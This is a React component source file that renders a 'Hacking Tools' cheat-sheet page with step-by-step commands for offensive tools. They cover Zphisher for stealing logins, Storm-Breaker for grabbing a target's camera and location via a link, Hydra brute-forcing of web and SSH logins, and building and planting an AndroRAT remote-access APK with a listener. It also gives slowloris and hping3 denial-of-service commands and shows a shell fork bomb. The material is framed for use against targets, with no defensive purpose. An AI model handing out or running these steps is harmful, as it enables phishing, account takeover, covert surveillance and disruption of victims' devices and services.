import React, { useState } from 'react';
import './App.css';

function App() {
  const [showContent,setShowContent]=useState(false);
  const [showBtni,setShowBtni]=useState(false);
  const [setFake,setFakePage]=useState(false);
  const [setZphi,setZphiImg]=useState(false);
  const [setCam,setCamLoc]=useState(false);
  const [setHunt,setHuntUser]=useState(false);
  const [setCrack,setCrackPwd]=useState(false);
  const [setApk,setApkRat]=useState(false);


  return(
    /*backgroundImage:"url('https://shorturl.at/hixI7')",backgroundSize:'cover',backgroundRepeat:'no repeat',minHeight: '100vh',}}*/
    <div className='App'>      
      <h1 style={{textAlign:'center',backgroundColor:'blue'}}>Hacking Tools</h1>

      {/*EvilLimiter*/}
      <div>
      <button onClick={()=>setShowContent(!showContent)}>Tool to limit targets network</button>
      {showContent&&(
        <div style={{textAlign:'left'}}>
        <p>Git :<a href='https://github.com/bitbrute/evillimiter'>https://github.com/bitbrute/evillimiter</a></p>
        <h3>Steps:</h3>
        <p>1)Clone the given repo</p>
        <p>2)sudo python3 setup.py install</p>
        <p>3)cd bin sudo ./evillimiter</p>
        </div>
      )}
      </div>

      {/*Zphisher*/}
      <div>
      <button onClick={()=>setFakePage(!setFake)}>Phish by pages,Steal login Info</button>
      {setFake&&(
        <div style={{textAlign:'left'}}>
        <p><a href='https://github.com/htr-tech/zphisher.git'>https://github.com/htr-tech/zphisher.git</a></p>
        <p>1)Clone the repo zphisher(git)</p>
        <p>2)sudo ./zphisher.sh</p>
        <p><span onMouseEnter={()=>setZphiImg(true)} onMouseLeave={()=>setZphiImg(false)}>Reference</span></p>
        {setZphi&&<img src='/images/zphi.png' alt=""/>}
        </div>
      )}
      </div>

      {/*Access Camera & location through link*/}
      <div>
        <button onClick={()=>setCamLoc(!setCam)}>Access Cam,Loc By Link(User dependent)</button>
        {setCam&&(
          <div style={{textAlign:'left'}}>
            <p>Storm-Breaker(GitHub):<a href='https://github.com/ultrasecurity/Storm-Breaker.git'>https://github.com/ultrasecurity/Storm-Breaker.git</a></p>
            <p>sudo bash install.sh</p>
            <p>python3 -m pip install -r requirements.txt</p>
            <p>sudo python3 st.py(In new terminal)</p>
            <p>Got to 2525 port &send to target</p>
          </div>
        )}
      </div>

      {/*Hunt Down Social user*/}
      <div>
        <button onClick={()=>setHuntUser(!setHunt)}>Hunt socialmedia for usernames</button>
        {setHunt&&(
          <div style={{textAlign:'left'}}>
            <p>Sherlock(Git):<a href='https://github.com/sherlock-project/sherlock.git'>https://github.com/sherlock-project/sherlock.git</a></p>
            <p>python3 -m pip install -r requirements.txt</p>
            <p>sudo python3 -m pip install pandas</p>
            <p>Ex:python3 sherlock abhi_5104</p>
          </div>
        )}
      </div>

      {/*Crack pwds*/}
      <div>
        <button onClick={()=>setCrackPwd(!setCrack)}>Crack passwords</button>
        {setCrack&&(
          <div style={{textAlign:'center'}}>
            <h1>Gobuster</h1>
            <h1>Hydra</h1>
            <p>{/*IP =>sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
SSH =>1)sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt <ip> -t 4 ssh
      2)After getting password=>ssh molly@ip(Later pwd to enter).Next ls*/}</p>
          </div>
        )}
      </div>

      <div>
        <button onClick={()=>setApkRat(!setApk)}>Gain Access by APK</button>
        {setApk&&(
          <div style={{textAlign:'left'}}>
          <p>AndroRAT(Git):<a href='https://github.com/karma9874/AndroRAT.git'>https://github.com/karma9874/AndroRAT.git</a></p>
          <p>pip install -r requirements.txt</p>
          <p>Now sudo python3 androRAT.py --build -i ip -p 4444 -o bolt.apk</p>
          <p>sudo systemctl apache2.service</p>
          <p>sudo cp bolt.apk /var/www/html</p>
          <p>sudo python3 androRAT.py --shell -i 0.0.0.0 -p 4444(Waiting for connections..)</p>
          <p>Install apk into target phone</p>
          <p>help</p>
          </div>
        )}
      </div>


      {/*  Tricks */}
      <div style={{textAlign:'left',paddingLeft:'20px',}}>
        <h3>Tricks</h3>
        <h4>1)Hide content in images(Steghide)</h4>
        <h5>.....steghide embed -ef res.txt -cf input.jpg -sf out.jpg</h5>
        <h5>.....Extraction:steghide extract -sf out.jpg</h5>
        <h4>2)Slow target's browser</h4>
        <h5>nmap --script http-slowloris ip,install from git (slowloris)Last:-perl slowloris.pl -dns ip Linux inbuilt:sudo hping3 ip -1 --fast</h5>
        <h4> Convert imges to sequential video</h4>
        <h5>ffmpeg -framerate 0.5 -i ~/testimg/%d.jpg -vf "scale=512:-2" -c:v libx264 -pix_fmt yuv420p realone.mp4</h5>
        <h4>File Location- readlink -f abcd.txt</h4>
      </div>

      <div style={{display:'flex',alignItems:'center'}}>
        <button onClick={()=>setShowBtni(!showBtni)} style={{alignSelf:'flex-start',background:'none',border:'none',cursor:'pointer',padding:0}}>
        <img src='https://media.istockphoto.com/id/848929150/vector/cartoon-bomb-drawing.jpg?s=612x612&w=0&k=20&c=m2TqYcCF7DXelKo9NC28-4sceo4ulgloqqmCBhabobE=' width='300' height='200' style={{display:'block'}} alt=""/>
        </button>
        {showBtni&&(<p style={{padding:'30px'}}>:&#40;&#41;&#123; :|: &amp; &#125;;:</p>)}
      </div>




      {/* Utilities */}
      <div>
        <h1>Utilities</h1>
        <h2>hollywood</h2>
        <h2>Sudocabulary(New word meaning everytime)</h2>
      </div>

    </div>
  );
}

export default App;
